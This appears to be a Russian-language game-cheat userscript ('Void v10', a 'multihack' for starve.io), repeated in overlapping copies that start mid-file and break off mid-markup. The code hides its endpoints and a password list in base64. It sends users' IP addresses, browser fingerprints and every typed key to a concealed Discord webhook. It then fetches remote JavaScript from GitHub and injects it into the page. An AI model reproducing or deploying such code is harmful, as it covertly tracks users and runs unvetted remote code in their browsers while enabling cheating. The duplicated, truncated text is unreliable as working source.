    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/xEn5KZnQWv0?autoplay=1&mute=1&controls=0&loop=1&playlist=xEn5KZnQWv0&enablejsapi=1&vq=hd1080"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="loginBox" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div class="login-box">
                <h1 class="shimmer-text">VOID | V5 BY AMONGUS</h1>
                <div style="display: flex; justify-content: center; align-items: center; margin-top: 20px; gap: 10px;">
                    <input id="voidInput" type="password" placeholder="P A S S W O R D"
                        class="login-input" style="max-width: 300px;" />
                        <div style="position: absolute; right: calc(50.5% - -160px); top: 50%; transform: translateY(-10%);">
                            <svg id="toggleEye" xmlns="http://www.w3.org/2000/svg"
                                width="34" height="34" viewBox="0 0 24 24"
                                fill="none" stroke="gray" stroke-width="2"
                                stroke-linecap="round" stroke-linejoin="round"
                                style="cursor: pointer; opacity: 0.9;">
                                <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/>
                                <circle cx="12" cy="12" r="3"/>
                            </svg>
                        </div>
                </div>
                
                            
                <br>
                <button onclick="submitVoidKey()" class="login-button">Войти</button>
            </div>     
        </div>`;
        document.addEventListener("click", () => {
            const iframe = document.getElementById("bgVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        }, { once: true });
        setTimeout(() => {
            const eye = document.getElementById("toggleEye");
            const input = document.getElementById("voidInput");
            let visible = false;
        
            eye.addEventListener("click", () => {
                visible = !visible;
                input.type = visible ? "text" : "password";
                eye.innerHTML = visible
                    ? `<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19c-7 0-11-7-11-7a17.11 17.11 0 0 1 5.06-5.94"/><path d="M1 1l22 22"/>`
                    : `<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/>`;
            });
        }, 0);          
     }

    window.submitVoidKey = () => {
        const key = document.getElementById("voidInput").value.trim();
        if (!key) return freezeWithOverlay();

        let attemptsLeft = parseInt(localStorage.getItem(attemptKey)) || maxAttempts;

        if (_0x4a8cf3.includes(key)) {
            const fingerprint = getFingerprint();
            fetch("https://api.ipify.org?format=json")
                .then(res => res.json())
                .then(data => sendToDiscord(`✅ Доступ с IP: \`${data.ip}\`\nКлюч: \`${key}\`\nFingerprint: \`${fingerprint}\``));

            if (confirm("Сохранить пароль?")) {
                setCookie(cookieKeyName, key, cookieExpiryDays);
            }else{
                setCookie();
                alert("Очень хорошо")
                document.body.innerHTML = "";
                location.reload();
                waitForDOM(startVoidScript);
            }

            localStorage.setItem("fingerprint", fingerprint);
            resetAttempts();
            alert("Добро пожаловать!!!");
            document.body.innerHTML = "";
            location.reload();
            waitForDOM(startVoidScript);
        } else {
            attemptsLeft--;
            localStorage.setItem(attemptKey, attemptsLeft);
            sendToDiscord(`Неверный ключ: \`${key}\` | Осталось: ${attemptsLeft}`);
            if (attemptsLeft <= 0) {
                blockForMinutes(blockMinutes);
                alert("Неверный ключ. Блокировка на 30 минут.");
                freezeWithOverlay("⛔ Заблокировано на 30 минут", "42px");
            } else {
                alert(`Неверный ключ. Осталось попыток: ${attemptsLeft}`);
            }
        }
    };

    function checkAccess() {
        if (isBlocked()) {
            freezeWithOverlay("Заблокировано на 30 минут", "42px");
            return;
        }

        const cookie = getCookie(cookieKeyName);
        if (cookie && _0x4a8cf3.includes(cookie)) {
            alert(`Осталось дней: ${cookieExpiryDays}`);
            waitForDOM(startVoidScript);
        } else {
            showPreloadScreen();
        }
    }

    function startVoidScript() {
        fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM="))
            .then(r => r.text())
            .then(code => {
                const s = document.createElement("script");
                s.textContent = code;
                document.documentElement.appendChild(s);
            });
    }
    checkAccess();
})();// ==UserScript==
// @name         Void v10
// @version      V10
// @description  Most advanced multihack ever built
// @match        *://starve.io/*
// @author       Otterly
// @run-at       document-start
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const encoded = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL01yRGFya3MyMDA4L1ZPSUQtVjUvcmVmcy9oZWFkcy9tYWluL2Ftc2cuanM=";
    const url = atob(encoded);
    const _0x3bc2f9 = atob;
    const _0x5ed42a = JSON['parse'];
    const _0x4a8cf3 = _0x5ed42a(_0x3bc2f9("WyJaYWx1cGFib2JyYXR2bmV0MTJhc2R3ZWFza3dla2Fzbm5yaGdzYWxxZXlqIiwiSGVscGVyUHJlc2lkZW50U2luYmFrbGFzaHluYWViYW5vZ29vbnNvc2V0bW5leWF0c2FpNGxlbmlja3MiLCJMZXRTb2xvSGVycGlzeWFuZXRKb3NraWlKb2tpckJhYmxvRGVwYW1pZyIsImFzYXNqZmF3ZWFzc2RqYWpkd2FlYXVzaGRtYm1hbm1zZnd1YWV3IiwiYWFhYWN3ZWFzZHdhcmV0eXJ0dXllaGZkaGdkamFzc2F6enhhY3h2YmJuZXJnYXdiciIsIk1vc2hlbmljUHNobE5heHlpU2luYmx5YWRpbWFteWViYWxqb2tlc2F2YWxpZWJhbG9zaW5zbGlodSIsImh1cGVyY2FzaXJlYmFuaXlzYXN5bnlsdmpvcHlwb21pZG9yc2hhdHVsa2EyMzQiLCJhc2phc3VmaHN1YWZ1aWFzZmhhc2Zic2FmYmFzYmJhd3kiLCIyM2FzZGFqMjM1a2F3NWo4YXNkbW5hMWJhc253ZGFuNzQyNHdiYWZnIiwiR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTEdTRUxMR0dTRUxMR0dTRUxMR0dTRUxHU0VMTCIsInNsb25vcGlkb3Jpbm9ib21iYXJkaXJvcGlkb3Jpbm9zb3Npc2thdHZhbW9ncHNobmF5eCIsInNhZmFzamZzYXN1ZmF3ZmF3Zm5hc2ZzbWFmbmFzamZhYnd5YmVkYXciLCJzYXNpZGFzZHVhaGRhd2Vhd3VkYm5zbmFqeGNuYXNjYmFid2UiLCJNYXJ1aXNYY1JlZWR3cjMwbWlsbGlvbmJ1dGFtb25ndXNkZWZwcm8iXQ=="));
    const cookieKeyName = "void_key";
    const cookieExpiryDays = 5;
    const maxAttempts = 4;
    const blockMinutes = 30;
    const storagePrefix = "void_ksys_";
    const blockUntilKey = storagePrefix + "block_until";
    const attemptKey = storagePrefix + "attempts";
    const webhookURL = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NDg1OTM2NTQ4MzIxNjkwNi9SMHd5d3N1UHRiaERtTVNpeW1qZDZOSG83V0NjbkRUeWM2YXN4anR5NGhoX3hBUmlicWxCRE5JaFpPUkdwRHQ1MVcy";

    const now = () => new Date().getTime();

    function sendToDiscord(content) {
        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                content: content,
                username: "Void Access Log",
                avatar_url: "https://i.imgur.com/qGm0zW1.png"
            })
        }).catch(() => {});
    }

    function getFingerprint() {
        return btoa(navigator.userAgent + screen.width + screen.height + navigator.language);
    }

    function getCookie(name) {
        const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
        return match ? decodeURIComponent(match[2]) : null;
    }

    function setCookie(name, value, days) {
        const expires = new Date();
        expires.setTime(expires.getTime() + (days * 86400000));
        document.cookie = `${name}=${encodeURIComponent(value)};expires=${expires.toUTCString()};path=/;SameSite=Strict`;
    }

    function freezeWithOverlay(message = "Starve.io", fontSize = "64px") {
        document.body.innerHTML = `
        <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#236b45;z-index:9999;display:flex;justify-content:center;align-items:center;">
            <div style="background:rgba(0,0,0,0.8);padding:80px 150px;border-radius:20px;">
                <span style="color:white;font-size:${fontSize};font-weight:bold;font-family:sans-serif;">${message}</span>
            </div>
        </div>`;
    }

    function isBlocked() {
        const until = localStorage.getItem(blockUntilKey);
        return until && parseInt(until) > now();
    }

    function resetAttempts() {
        localStorage.setItem(attemptKey, maxAttempts);
        localStorage.removeItem(blockUntilKey);
    }

    function blockForMinutes(mins) {
        const blockUntil = now() + mins * 60000;
        localStorage.setItem(blockUntilKey, blockUntil.toString());
    }

    function waitForDOM(callback) {
        if (document.body) {
            callback();
        } else {
            setTimeout(() => waitForDOM(callback), 50);
        }
    }

    function showPreloadScreen() {
        document.body.innerHTML = `
        <style>
        @keyframes shimmer {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #ffffff 0%, #686868 50%, #3e3e3e 100%);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: shimmer 2.5s infinite linear;
        }
        </style>
        <div id="clickableArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="introVideo" width="100%" height="100%"
                src="https://www.youtube.com/embed/MiKbtSFKXL8?autoplay=1&mute=1&controls=0&loop=1&playlist=MiKbtSFKXL8&enablejsapi=1"
                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen
                style="position:absolute;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:-1;"></iframe>
        </div>
        <div id="clickableContent" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;justify-content:center;align-items:center;cursor:pointer;">
            <div style="background:rgba(0,0,0,0.5);padding:60px 120px;border-radius:20px;text-align:center;">
                <h1 class="shimmer-text">Подождите, загрузка файлов...</h1>
            </div>
        </div>`;

        const enableVideoSound = () => {
            const iframe = document.getElementById("introVideo");
            if (iframe) {
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "unMute", args: [] }), "*");
                iframe.contentWindow.postMessage(JSON.stringify({ event: "command", func: "playVideo", args: [] }), "*");
            }
        };

        document.getElementById("clickableArea").addEventListener("click", enableVideoSound, { once: true });
        document.getElementById("clickableContent").addEventListener("click", enableVideoSound, { once: true });

        setTimeout(() => {
            alert("Файлы успешно загружены!");
            showLoginWithVideo();
        }, 35000);
    }

    function showLoginWithVideo() {
        setTimeout(() => {
            alert("Время вышло (2:08), страница будет закрыта");
            window.location.href = "https://youtu.be/LaRMPcCvseg?si=QxaqIJzbd1kBnZDR";
        }, 128000);
    
        document.body.innerHTML = `
        <style>
        @keyframes pulse {
            0% { background-color: rgba(0,0,0,0.6); }
            50% { background-color: rgba(255,255,255,0.1); }
            100% { background-color: rgba(0,0,0,0.6); }
        }
        @keyframes textGlow {
            0% { background-position: -300px 0; }
            100% { background-position: 300px 0; }
        }
        .shimmer-text {
            font-size: 36px;
            font-family: sans-serif;
            color: transparent;
            background: linear-gradient(to right, #635fcc, #0a72d2, #068ee3);
            background-size: 600px 100%;
            -webkit-background-clip: text;
            background-clip: text;
            animation: textGlow 2.5s infinite linear;
        }
        .login-box {
            background: rgba(0, 0, 0, 0.4);
            animation: pulse 3s infinite;
            padding: 40px 80px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 0 30px rgba(255,255,255,0.1);
        }
        .login-input {
            margin-top: 20px;
            padding: 10px;
            font-size: 24px;
            border-radius: 8px;
            border: none;
            width: 100%;
            max-width: 300px;
            background: rgba(255,255,255,0.05);
            color: white;
            text-align: center;
        }
        .login-button {
            margin-top: 20px;
            font-size: 20px;
            padding: 10px 30px;
            border-radius: 10px;
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            cursor: pointer;
            animation: pulse 3s infinite;
        }
        </style>
        <div id="bgClickArea" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:9998;overflow:hidden;cursor:pointer;">
            <iframe id="bgVideo" width="100%" height="100%"
